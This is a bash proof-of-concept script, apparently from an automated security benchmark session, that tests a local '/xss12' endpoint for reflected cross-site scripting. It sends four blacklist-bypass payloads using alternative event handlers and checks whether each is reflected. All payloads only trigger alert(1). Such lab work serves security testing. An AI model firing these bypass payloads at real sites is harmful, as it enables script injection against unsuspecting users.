#!/bin/bash
# POC: Demonstrates reflected XSS vulnerability in /xss12 endpoint with blacklist filter bypass using alternative event handlers and encoding bypasses
# Target: ./repo
# Created: 2025-11-06T21:33:59.657Z
# Session: benchmark-XBEN-051-24-mhnxsg1t

# Reflected XSS Vulnerability POC - /xss12 endpoint
# Tests blacklist filter bypass using alternative event handlers

TARGET="${1:-http://localhost:5000}"
ENDPOINT="/xss12"

echo "================================"
echo "XSS Blacklist Filter Bypass POC"
echo "================================"
echo ""

# Test 1: Basic XSS with onerror (not in blacklist)
echo "[Test 1] Basic XSS with onerror event handler"
PAYLOAD='<img src=x onerror=alert(1)>'
ENCODED_PAYLOAD=$(echo -n "$PAYLOAD" | jq -sRr @uri)
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?name=${ENCODED_PAYLOAD}")

if echo "$RESPONSE" | grep -q "onerror"; then
    echo "✓ VULNERABLE: onerror payload reflected in response"
    echo "  Payload: $PAYLOAD"
    echo "  URL: ${TARGET}${ENDPOINT}?name=${ENCODED_PAYLOAD}"
    echo ""
else
    echo "✗ Not vulnerable to onerror payload"
    echo ""
fi

# Test 2: Bypass onload with spaces
echo "[Test 2] Bypass onload filter with spaces"
PAYLOAD='<svg o n l o a d=alert(1)>'
ENCODED_PAYLOAD=$(echo -n "$PAYLOAD" | jq -sRr @uri)
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?name=${ENCODED_PAYLOAD}")

if echo "$RESPONSE" | grep -q "o n l o a d"; then
    echo "✓ VULNERABLE: Space-separated onload payload bypasses filter"
    echo "  Payload: $PAYLOAD"
    echo "  URL: ${TARGET}${ENDPOINT}?name=${ENCODED_PAYLOAD}"
    echo ""
else
    echo "✗ Not vulnerable to space-separated onload payload"
    echo ""
fi

# Test 3: ontouchstart event handler
echo "[Test 3] Alternative event handler - ontouchstart"
PAYLOAD='<img ontouchstart=alert(1)>'
ENCODED_PAYLOAD=$(echo -n "$PAYLOAD" | jq -sRr @uri)
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?name=${ENCODED_PAYLOAD}")

if echo "$RESPONSE" | grep -q "ontouchstart"; then
    echo "✓ VULNERABLE: ontouchstart payload reflected in response"
    echo "  Payload: $PAYLOAD"
    echo "  URL: ${TARGET}${ENDPOINT}?name=${ENCODED_PAYLOAD}"
    echo ""
else
    echo "✗ Not vulnerable to ontouchstart payload"
    echo ""
fi

# Test 4: onmousemove event handler
echo "[Test 4] Alternative event handler - onmousemove"
PAYLOAD='<img onmousemove=alert(1)>'
ENCODED_PAYLOAD=$(echo -n "$PAYLOAD" | jq -sRr @uri)
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?name=${ENCODED_PAYLOAD}")

if echo "$RESPONSE" | grep -q "onmousemove"; then
    echo "✓ VULNERABLE: onmousemove payload reflected in response"
    echo "  Payload: $PAYLOAD"
    echo "  URL: ${TARGET}${ENDPOINT}?name=${ENCODED_PAYLOAD}"
    echo ""
else
    echo "✗ Not vulnerable to onmousemove payload"
    echo ""
fi

echo "================================"
echo "POC Complete"
echo "================================"